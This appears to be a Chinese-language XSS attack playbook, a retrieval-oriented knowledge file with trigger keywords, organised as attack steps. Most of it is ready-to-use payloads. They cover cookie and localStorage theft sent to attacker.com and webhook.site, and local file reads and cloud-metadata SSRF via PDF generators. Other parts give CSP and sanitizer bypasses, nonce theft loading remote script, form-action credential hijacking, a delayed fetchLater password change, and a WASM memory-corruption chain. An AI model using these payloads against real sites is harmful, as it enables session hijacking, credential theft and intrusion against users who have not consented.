---
category: web
tags: [xss, cross_site_scripting, dom_xss, reflected_xss, stored_xss, csp_bypass, 跨站脚本, 反射型xss, 存储型xss, dom型xss, csp绕过, xss_filter_bypass, 过滤绕过, markdown_xss, pdf_xss, wasm_xss, browser_extension_xss, 浏览器扩展xss, self_xss, iframe_xss]
triggers: [xss, cross-site scripting, script injection, alert, onerror, onload, innerHTML, document.write, eval, document.cookie, reflected, stored, dom-based, content-security-policy, csp, 跨站脚本, 脚本注入, sanitize, DOMPurify, markdown, pdf generation, wkhtmltopdf, wasm, webassembly, "<script>", "<img src=x", "javascript:", srcdoc, postMessage, window.name]
related: [sqli, ssti, command_injection, prototype_pollution, websocket, oauth]
---

# 跨站脚本攻击 (XSS)

## 什么时候用

用户输入被嵌入 HTML/JavaScript 上下文输出，而未经充分编码或过滤。常见场景：
- 搜索结果页回显搜索词（反射型）
- 评论/留言/用户名等持久存储后渲染（存储型）
- 前端 JS 直接从 URL/cookie/storage 取值写入 DOM（DOM 型）
- PDF 生成引擎解析用户输入中的 HTML（服务端 XSS）
- Markdown 渲染器未过滤 HTML 标签或 `javascript:` 链接
- 浏览器扩展的 `web_accessible_resources` 页面接受外部参数

## 前提条件

- 用户输入出现在 HTML 响应体中（或被 JS 处理后写入 DOM）
- 输出点没有正确的上下文编码（HTML 实体 / JS 转义 / URL 编码）
- CSP 不存在或可绕过
- 对于 DOM XSS：存在从 source 到 sink 的不安全数据流

## 攻击步骤

### 1. 判断 XSS 类型与注入点

**探测向量**（按上下文选择）：

```html
<!-- HTML 标签上下文 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- HTML 属性上下文 -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='

<!-- JavaScript 上下文 -->
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>

<!-- URL 上下文 -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**反射型 vs 存储型**：如果 payload 在刷新后仍触发，则为存储型；仅当前请求触发则为反射型。

### 2. 反射型 XSS (Reflected)

输入直接在响应中回显。常见于搜索框、错误页面、URL 参数回显。

```
https://target.com/search?q=<script>alert(document.cookie)</script>
https://target.com/page?name=<img src=x onerror=alert(1)>
```

**窃取 Cookie 的标准 payload**：
```html
<script>
new Image().src="https://attacker.com/?c="+encodeURIComponent(document.cookie);
</script>

<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

### 3. 存储型 XSS (Stored)

Payload 持久化到服务器（数据库/文件），每次页面加载时执行。攻击面更大，可攻击管理员。

```html
<!-- 在评论/用户名/个人简介等字段注入 -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

<!-- 管理后台常见场景：bug report 详情被 innerHTML 渲染 -->
<img src=x onerror="fetch('http://ATTACKER/?c='+document.cookie)">
```

当应用禁用了 HttpOnly（如 Flask `SESSION_COOKIE_HTTPONLY = False`），被盗 Cookie 可直接复用会话，即使 `secret_key` 每次启动随机生成。

### 4. DOM XSS

完全在客户端发生，服务器不参与。攻击者控制的**源 (source)** 数据流入危险的**汇 (sink)** 函数。

**常见 Sources**：
```javascript
document.URL
document.documentURI
document.referrer
document.cookie
location              // location.search, location.hash, location.href
window.name           // 跨域导航后仍保留！
history.pushState / replaceState
localStorage / sessionStorage
postMessage           // 跨窗口消息
IndexedDB
```

**高危 Sinks**：
```javascript
// 直接执行 JS
eval()
Function()
setTimeout() / setInterval()
setImmediate()

// HTML 注入
document.write() / document.writeln()
element.innerHTML / outerHTML
element.insertAdjacentHTML()
jQuery.html() / .append() / .prepend() / .after() / .before()
jQuery.parseHTML()

// URL 导航
location / location.href / location.assign() / location.replace()
window.open()
element.srcdoc
```

**注意**：`innerHTML` sink 在现代浏览器中不会执行 `<script>` 标签，也不会触发 `<svg onload>`，需要使用 `<img onerror>` 或 `<iframe>` 等替代元素。

#### window.name 滥用

`window.name` 在跨域导航后仍然保留，攻击者可以预设恶意值：

```html
<!-- 攻击者页面：通过 iframe name 注入 -->
<iframe name="<img src=x onerror=fetch('https://oast/?f='+btoa(localStorage.flag))>"
        src="https://target/page"></iframe>

<!-- 或通过 window.open -->
<script>
window.open('https://target/page', "<svg/onload=alert(document.domain)>")
</script>
```

如果目标页面执行 `element.innerHTML = name`，攻击者控制的 `window.name` 就会在目标 origin 执行。

#### template literal innerHTML 漏洞

前端部分字段用 DOMPurify 但遗漏某些字段：

```javascript
reports.forEach(report => {
  reportCard.innerHTML = `
    <div>${DOMPurify.sanitize(report.id)}</div>
    <div>${report.details}</div>  <!-- 未过滤 -->
  `;
});
```

未过滤字段若存储在服务端，形成**存储型 DOM XSS**。

#### 自动化 Bot 流程利用

Playwright/Puppeteer Bot 经常先在 `localStorage` 设置 secret 再访问用户 URL：

```javascript
// 任何 XSS 原语都可以窃取预设的 secret
fetch('https://webhook.site/<id>?flag=' +
  encodeURIComponent(localStorage.getItem('flag')))

// 如果 Bot 不限制 scheme，直接用 javascript: URL
// javascript:fetch('https://attacker.com/?f='+localStorage.flag)
```

### 5. 服务端 XSS（动态 PDF 生成）

PDF 生成引擎（wkhtmltopdf、TCPDF、PDFKit、iText 等）解析用户输入中的 HTML。可升级为本地文件读取和 SSRF。

**探测**：
```html
<img src="x" onerror="document.write('test')">
<script>document.write(JSON.stringify(window.location))</script>
```

**读取本地文件**：
```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>

<iframe src="file:///etc/passwd"></iframe>
<embed src="file:///etc/passwd" width="400" height="400">
```

**SSRF（访问云元数据）**：
```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","http://169.254.169.254/latest/meta-data/");x.send();
</script>
```

**SVG 容器 payload**（适用于上传 SVG 触发的场景）：
```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="800" height="500">
  <g>
    <foreignObject width="800" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
      </body>
    </foreignObject>
  </g>
</svg>
```

**PD4ML 附件读文件**：
```html
<html>
  <pd4ml:attachment src="/etc/passwd" description="leak" icon="Paperclip"/>
</html>
```

**端口扫描**：
```html
<script>
const checkPort = (port) => {
  fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
    new Image().src = `http://attacker.com/ping?port=${port}`;
  });
}
for(let i=0; i<1000; i++) checkPort(i);
</script>
```

## 过滤绕过

### 标签/关键词被过滤

```html
<!-- 大小写混合 -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- 斜杠替代空格 -->
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- 换行/Tab 打断关键词 -->
<img src=x onerror=aler&#x74;(1)>
<script>al\u0065rt(1)</script>

<!-- 非标准标签 -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>

<!-- 编码绕过 -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
<a href="javascript&#58;alert(1)">click</a>
```

### 括号被过滤

```html
<img src=x onerror=alert`1`>
<img src=x onerror="window.onerror=alert;throw 1">
<svg/onload=alert&lpar;1&rpar;>
<img src=x onerror=location='javascript:alert\x281\x29'>
```

### 引号被过滤

```html
<img src=x onerror=alert(/xss/.source)>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

### JavaScript 上下文绕过

```javascript
// 字符串拼接
'-alert(1)-'
'+alert(1)+'
\';alert(1)//

// 模板字符串
${alert(1)}
`${alert(1)}`
```

### `innerHTML` 限制绕过

`innerHTML` 不执行 `<script>` 和 `<svg onload>`，使用：

```html
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

## CSP 绕过要点

### script-src 'self' 绕过

```html
<!-- 利用同源 JSONP 端点 -->
<script src="/api/jsonp?callback=alert(1)//"></script>

<!-- 利用同源文件上传（上传 .js 文件） -->
<script src="/uploads/evil.js"></script>

<!-- 利用同源 iframe 加载可执行页面 -->
<iframe src="uploaded_page.html"></iframe>
```

即使 `script-src 'none'`，通过同源 iframe `src` 加载的页面在子 frame 内不受父 CSP 约束：

```python
@app.route("/")
def index():
    resp = flask.Response('<html><iframe src="cookie_s.html"></iframe></html>')
    resp.headers['Content-Security-Policy'] = "script-src 'self'"
    resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
    return resp

@app.route("/cookie_s.html")
def cookie_s():
    return "<script>alert(document.cookie)</script>"
```

### Nonce 窃取（同源 iframe 提权）

同源页面可以读取父页面的 nonce：

```javascript
const n = top.document.querySelector('[nonce]').nonce;
const s = top.document.createElement('script');
s.src = '//attacker.com/pwn.js';
s.nonce = n;
top.document.body.appendChild(s);
```

将 HTML 注入升级为 XSS，即使在 `strict-dynamic` 下也有效。

### Dangling Markup 泄露

CSP 阻止脚本执行，但仍可通过 dangling markup 泄露敏感 token：

```html
<!-- 注入点紧接敏感 script 之前，故意不闭合 name 属性 -->
<iframe name="//attacker.com/?">
```

```javascript
// attacker.com 读取泄露的数据
const victim = window.frames[0];
victim.location = 'about:blank';
console.log(victim.name); // 包含直到下一个引号的所有内容
```

### form-action 劫持

缺少 `form-action` 指令时，即使 `script-src 'none'` 也可劫持表单提交到外部域，密码管理器会自动填充并提交：

```html
<form action="https://attacker.com/steal">
  <!-- 浏览器密码管理器自动填充 -->
</form>
```

### data: / srcdoc 利用

```html
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
<iframe src="data:text/html;charset=utf-8,%3Cscript%3Ealert(1)%3C/script%3E"></iframe>
```

`script-src 'self'` 阻止 `data:` 和 `srcdoc`，但 CSP `'none'` 的 iframe 通过 `src` 加载同源 URL 仍可执行。

## 常见坑

- **HttpOnly Cookie**：设置了 HttpOnly 的 Cookie 无法通过 `document.cookie` 读取，需要通过 CSRF 或代理请求窃取
- **SameSite Cookie**：`SameSite=Strict/Lax` 限制跨站请求携带 Cookie，Self-XSS 配合 CSRF 可能是唯一利用路径
- **`innerHTML` 不执行 `<script>`**：现代浏览器中 `innerHTML` 写入的 `<script>` 不执行，用 `<img onerror>` 替代
- **CSP 拦截**：即使找到 XSS 注入点，严格的 CSP 可能阻止执行；先检查 CSP 头再构造 payload
- **DOMPurify 版本差异**：不同版本的 DOMPurify 行为差异可被利用（尤其是 Markdown + DOMPurify 组合的解析差异）
- **编码上下文混淆**：在 HTML 属性中需要 HTML 实体编码，在 JS 字符串中需要 JS 转义，在 URL 中需要 URL 编码——搞混会导致 payload 失效
- **Self-XSS 不等于无害**：通过 `credentialless` iframe + CSRF 可将 Self-XSS 升级为完整利用链

## 变体

### Markdown XSS

Markdown 渲染器通常接受内联 HTML，或 `javascript:` 链接：

```markdown
[Click me](javascript:alert(document.cookie))
[CaseInsensitive](JaVaScRiPt:alert('XSS'))
[URL bypass](javascript://www.google.com%0Aalert('XSS'))
[Base64](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

**img 事件注入**：
```markdown
![XSS]("onerror="alert('XSS'))
![XSS](https://example.com/img.png"onload="alert('XSS'))
```

**DOMPurify + Marked 解析差异绕过**：
```html
<div id="1

![](contenteditable/autofocus/onfocus=confirm('xss')//index.html)">
```

DOMPurify 先清洗 HTML 认为安全，Marked 再解析 Markdown 语法产生新的可执行元素。

**Gopher 协议（SSRF 升级）**：
```markdown
![pwn](gopher://127.0.0.1:1337/_GET%20/api/dev%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0Ax-api-key:%20SECRET%0D%0A%0D%0A)
```

### 浏览器扩展 XSS

扩展的 `web_accessible_resources` 页面可被外部 iframe 加载并注入参数：

```javascript
// 攻击者页面创建指向扩展页面的 iframe
let frame = document.createElement("iframe");
frame.src = "chrome-extension://EXTENSION_ID/message.html?content=" +
  encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(frame);
```

宽松的扩展 CSP（`'unsafe-eval'`）+ jQuery `.html()` 拼接 = DOM XSS。可结合 ClickJacking 实现无交互利用。

### credentialless iframe + Self-XSS 升级

Chrome 110+ 默认启用 credentialless iframe，网络请求不携带凭证，但同源 iframe 间 DOM 仍可互通：

```html
<!-- iframe 1: credentialless，通过 CSRF 触发 Self-XSS -->
<iframe credentialless src="trigger_self_xss.html"></iframe>

<!-- iframe 2: 正常加载（携带凭证） -->
<iframe src="https://victim.com/dashboard"></iframe>
```

Self-XSS 执行后通过 `window.top[1].document.cookie` 窃取另一 iframe 的 Cookie。

### fetchLater 攻击

`fetchLater` API 允许延迟发送请求，可实现"定时炸弹"式攻击：

```javascript
var req = new Request("/change_password", {
  method: "POST",
  body: JSON.stringify({new_password: "hacked"}),
  credentials: "include"
});
const minute = 60000;
[minute, minute*60, minute*60*24].forEach(t =>
  fetchLater(req, {activateAfter: t})
);
```

登录攻击者会话 → 设置 fetchLater → 登出 → 受害者登录自己的会话 → 延迟请求在受害者会话中触发。

### Chrome 缓存投毒 XSS

利用 bfcache / disk cache 行为差异：
1. 用 `window.open()` 打开目标页面（保持 `window.opener` 引用，禁用 bfcache）
2. 触发目标 API 返回可控内容被 disk cache 缓存
3. `history.back()` 导航回时浏览器从 disk cache 渲染缓存的响应

Puppeteer 默认禁用 bfcache，使 disk cache 成为 fallback。

### WASM 线性内存腐蚀 → DOM XSS

Emscripten 编译的 WASM 模块中，"常量"字符串（如 HTML 模板）存在于可写的线性内存中。通过堆溢出覆盖 HTML 模板，将过滤后的输入变为 JS 处理器：

```c
// 原始模板：<article><p>%.*s</p></article>
// 覆盖为：  <img src=1      onerror=%.*s>
// 新消息 alert(1337) 经过滤后变为：
// <img src=1 onerror=alert(1337)> → 执行！
```

**利用步骤**：
1. 发送 N 条消息触发 `realloc()` 使 `s->mess` 相邻于用户 buffer
2. `editMsg()` 溢出覆盖 `msg_data` 指针，指向模板地址
3. 再次 `editMsg()` 改写模板为 `<img src=1 onerror=%.*s>`
4. 添加新消息（内容为 JS 代码），渲染时触发 XSS

**DevTools 调试辅助**：
```javascript
function searchWasmMemory(str){
  const mem = Module.HEAPU8, pat = new TextEncoder().encode(str);
  for(let i=0; i<mem.length-pat.length; i++){
    let ok=true;
    for(let j=0; j<pat.length; j++){ if(mem[i+j]!==pat[j]){ ok=false; break; } }
    if(ok) console.log(`Found "${str}" at address:`, i);
  }
}
```

核心原理：sanitizer 保护 source，攻击者转而腐蚀 sink（模板），使已过滤的输入在渲染时变为可执行。

## 相关技术

- [[sqli]] — 注入点在 SQL 而非 HTML 时
- [[ssti]] — 客户端模板注入（Angular/Vue）与 SSTI 有相似利用思路
- [[command_injection]] — XSS 到 RCE 的升级路径（如 PDF XSS → SSRF → 命令执行）
